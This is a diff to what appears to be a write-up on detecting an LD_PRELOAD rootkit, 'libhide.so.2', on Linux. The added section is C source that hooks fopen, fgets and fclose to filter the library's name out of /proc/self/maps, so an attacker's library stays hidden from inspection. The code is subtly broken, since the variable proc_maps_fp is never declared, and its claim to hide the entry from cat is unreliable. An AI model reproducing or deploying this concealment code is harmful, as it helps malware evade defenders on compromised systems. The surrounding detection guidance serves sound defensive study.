@@ -50,6 +50,58 @@ ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsysca
 ```
 As you can see above, clearly libhide.so.2 is being used here. In addition, if we run ls -l /usr/local/lib/, we see that there is nothing listed in that directory
 At least thats what we're being told! Another note, there is a way to hide this entry from cat /proc/self/maps. So, this may not show up if attacker purposely hides it from virtual memory.
+Below is the code needed to hide from cat /proc/self/maps
+```#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <dirent.h>
+#include <dlfcn.h>
+#include <stdarg.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+#include <limits.h>
+
+FILE *fopen(const char *pathname, const char *mode) {
+    static FILE* (*orig_fopen)(const char*, const char*) = NULL;
+    if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, "fopen");
+
+    FILE *fp = orig_fopen(pathname, mode);
+    
+    // Check if process is reading its own memory maps
+    if (pathname && strstr(pathname, "/proc/") && strstr(pathname, "/maps")) {
+        proc_maps_fp = fp; 
+    }
+    return fp;
+}
+
+char *fgets(char *s, int size, FILE *stream) {
+    static char* (*orig_fgets)(char*, int, FILE*) = NULL;
+    if (!orig_fgets) orig_fgets = dlsym(RTLD_NEXT, "fgets");
+
+    char *result;
+    while ((result = orig_fgets(s, size, stream)) != NULL) {
+        // If current stream is the maps file, filter out our library name
+        if (stream == proc_maps_fp && strstr(s, "libhide.so.2")) {
+            continue; 
+        }
+        break;
+    }
+    return result;
+}
+
+int fclose(FILE *stream) {
+    static int (*orig_fclose)(FILE*) = NULL;
+    if (!orig_fclose) orig_fclose = dlsym(RTLD_NEXT, "fclose");
+
+    if (stream == proc_maps_fp) {
+        proc_maps_fp = NULL;
+    }
+    return orig_fclose(stream);
+}
+```
+
 
 You can also find this shared library by runing ldd /usr/bin/lsof.<br>
 ```
